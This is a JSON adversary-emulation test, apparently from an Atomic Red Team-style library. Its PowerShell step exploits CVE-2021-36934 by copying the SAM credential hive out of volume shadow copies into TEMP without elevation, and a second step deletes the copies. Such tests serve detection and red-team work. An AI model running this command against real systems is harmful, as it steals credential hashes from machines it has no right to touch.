@@ -1,0 +1,58 @@
+{
+  "id": "9d77fed7-05f8-476e-a81b-8ff0472c64d0",
+  "name": "dump volume shadow copy hives with System.IO.File",
+  "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "0839800c-19c2-41fa-9842-61b7828cf64c",
+      "type": "execute-command",
+      "data": {
+        "command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8210236b-c6f4-4c4f-9043-8d3373c5ac29",
+      "type": "execute-command",
+      "data": {
+        "command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "0839800c-19c2-41fa-9842-61b7828cf64c",
+      "p": "on-success",
+      "o": "8210236b-c6f4-4c4f-9043-8d3373c5ac29"
+    },
+    {
+      "s": "0839800c-19c2-41fa-9842-61b7828cf64c",
+      "p": "on-failure",
+      "o": "8210236b-c6f4-4c4f-9043-8d3373c5ac29"
+    }
+  ],
+  "tags": [
+    "T1003.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "target_hive",
+      "type": "string",
+      "description": "Hive you wish to dump",
+      "value": "SAM"
+    },
+    {
+      "name": "limit",
+      "type": "integer",
+      "description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
+      "value": "10"
+    }
+  ]
+}
